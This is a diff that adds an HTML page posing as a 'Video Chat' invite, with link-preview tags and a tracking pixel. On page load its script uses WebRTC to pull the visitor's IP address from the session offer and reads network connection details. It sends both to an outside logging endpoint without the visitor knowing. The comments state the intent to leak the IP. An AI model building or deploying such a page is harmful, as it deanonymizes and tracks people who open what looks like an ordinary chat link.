@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Chat</title>
+    <meta property="og:title" content="Join Video Chat" />
+    <meta property="og:description" content="Click to join the video chat" />
+    <meta property="og:image" content="https://mtrf3.github.io/finding/pixel.gif" />
+</head>
+<body>
+    <script>
+        // Try to leak IP through WebRTC
+        var pc = new RTCPeerConnection();
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => {
+            pc.setLocalDescription(offer);
+            // Extract IP from SDP
+            var ip = offer.sdp.split('\n').find(line => line.includes('c=IN'));
+            fetch('https://mtrf3.github.io/finding/log.php?webrtc=' + encodeURIComponent(ip));
+        });
+
+        // Try to enumerate network interfaces
+        if(navigator.connection) {
+            fetch('https://mtrf3.github.io/finding/log.php?network=' + 
+                encodeURIComponent(JSON.stringify(navigator.connection)));
+        }
+    </script>
+</body>
+</html>
